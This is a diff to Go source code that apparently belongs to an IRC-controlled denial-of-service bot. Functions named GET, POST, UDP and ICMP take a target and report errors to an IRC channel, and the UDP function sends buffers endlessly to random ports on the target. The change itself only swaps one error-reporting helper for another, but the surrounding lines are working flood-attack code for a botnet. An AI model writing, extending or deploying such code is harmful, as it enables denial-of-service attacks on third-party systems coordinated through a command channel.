@@ -26,7 +26,7 @@ func GET(getTarget, set_chan string, reportIRC net.Conn) {
 	}
 	get_request, err := http.NewRequest("GET", getTarget+"/"+"user-agent", nil)
 	if err != nil {
-		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
+		IRC_Report(reportIRC, set_chan, err.Error())
 	}
 	_get := &http.Client{}
 
@@ -51,7 +51,7 @@ func POST(postTarget, set_chan string, reportIRC net.Conn) {
 	})
 	post_request, err := http.NewRequest("POST", postTarget+"/"+string(reqBody), nil)
 	if err != nil {
-		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
+		IRC_Report(reportIRC, set_chan, err.Error())
 	}
 	_post := &http.Client{}
 
@@ -77,7 +77,7 @@ func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
 	for {
 		udp, err := net.Dial("udp", udpTarget+":"+fmt.Sprint(rand.Intn(65535)))
 		if err != nil {
-			IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
+			IRC_Report(reportIRC, set_chan, err.Error())
 			break
 		}
 		udp.Write(buffer)
@@ -91,7 +91,7 @@ func UDP(udpTarget, size, set_chan string, reportIRC net.Conn) {
 func ICMP(icmpTarget, set_chan string, reportIRC net.Conn) {
 	conn, err := icmp.ListenPacket("udp4", "0.0.0.0")
 	if err != nil {
-		IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+err.Error())
+		IRC_Report(reportIRC, set_chan, err.Error())
 	}
 	defer conn.Close()
 
